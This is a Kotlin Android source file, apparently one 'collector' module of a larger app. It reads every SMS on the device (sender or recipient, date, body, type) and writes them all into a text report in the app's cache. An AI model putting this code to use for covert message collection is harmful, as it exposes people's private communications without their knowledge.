package com.kashem.shaikh.collectors

import android.content.ContentResolver
import android.content.Context
import android.net.Uri
import com.kashem.shaikh.services.AppLogs
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object Messages {

    fun collectMessages(context: Context): File? {
        val resolver: ContentResolver = context.contentResolver
        val uri = Uri.parse("content://sms/")

        val cursor = try {
            resolver.query(uri, null, null, null, null)
        } catch (e: SecurityException) {
            AppLogs.error("Messages: permission denied", e)
            return null
        } catch (e: Exception) {
            AppLogs.error("Messages: query failed", e)
            return null
        } ?: return null

        val sb = StringBuilder()
        sb.appendLine("***** SMS MESSAGES *****")
        sb.appendLine()
        sb.appendLine("Generated : ${
            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        }")
        sb.appendLine()

        var count = 0
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

        // ✅ FIX: cursor.use
        cursor.use { c ->
            val dateCol = c.getColumnIndex("date")
            val addressCol = c.getColumnIndex("address")
            val bodyCol = c.getColumnIndex("body")
            val typeCol = c.getColumnIndex("type")

            try {
                while (c.moveToNext()) {
                    // ✅ FIX: column index guard
                    val date = if (dateCol >= 0) {
                        try { dateFormat.format(Date(c.getLong(dateCol))) }
                        catch (_: Exception) { "Unknown" }
                    } else "Unknown"

                    val address = if (addressCol >= 0) c.getString(addressCol) ?: "Unknown" else "Unknown"
                    val body = if (bodyCol >= 0) c.getString(bodyCol) ?: "" else ""

                    val type = if (typeCol >= 0) {
                        when (c.getInt(typeCol)) {
                            1 -> "Received"
                            2 -> "Sent"
                            3 -> "Draft"
                            4 -> "Outbox"
                            5 -> "Failed"
                            6 -> "Queued"
                            else -> "Unknown"
                        }
                    } else "Unknown"

                    sb.appendLine("[$type] $date")
                    sb.appendLine("  From/To : $address")
                    sb.appendLine("  Message : $body")
                    sb.appendLine()
                    count++
                }
            } catch (e: Exception) {
                AppLogs.error("Messages: iteration failed", e)
            }
        }

        if (count == 0) {
            AppLogs.warn("Messages: no SMS found")
            return null
        }

        sb.appendLine("─────────────────────")
        sb.appendLine("Total: $count SMS")

        return try {
            val file = File(context.cacheDir, "messages.txt")
            FileOutputStream(file).use { it.write(sb.toString().toByteArray()) }
            AppLogs.info("Messages: $count SMS collected (${file.length()} bytes)")
            file
        } catch (e: Exception) {
            AppLogs.error("Messages: file write failed", e)
            null
        }
    }
}